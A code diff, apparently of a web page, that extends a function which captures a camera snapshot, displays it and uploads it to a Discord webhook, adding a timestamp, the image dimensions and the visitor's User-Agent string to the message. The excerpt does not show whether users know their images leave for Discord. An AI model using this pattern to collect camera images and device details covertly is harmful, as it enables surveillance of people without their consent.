@@ -94,18 +94,28 @@
             // Display the snapshot
             document.getElementById('snapshot').src = imageData;
 
-            // Send the image to Discord
-            uploadImageToDiscord(imageData);
+            // Send the image to Discord with additional details
+            uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight);
         }
 
-        async function uploadImageToDiscord(imageData) {
+        async function uploadImageToDiscord(imageData, width, height) {
             // Convert the base64 image to a Blob
             const blob = await fetch(imageData).then(res => res.blob());
 
             // Prepare the form data to be sent to Discord
             const formData = new FormData();
             formData.append('file', blob, 'snapshot.png');
-            formData.append('content', 'New snapshot captured.');
+
+            // Create a detailed message with additional information
+            const timestamp = new Date().toISOString();
+            const userAgent = navigator.userAgent; // Get User-Agent string
+            const content = `
+                Snapshot captured at: ${timestamp}
+                Image dimensions: ${width}x${height} pixels
+                Image format: PNG
+                Device Info: ${userAgent}
+            `;
+            formData.append('content', content.trim()); // Append the message to the form data
 
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
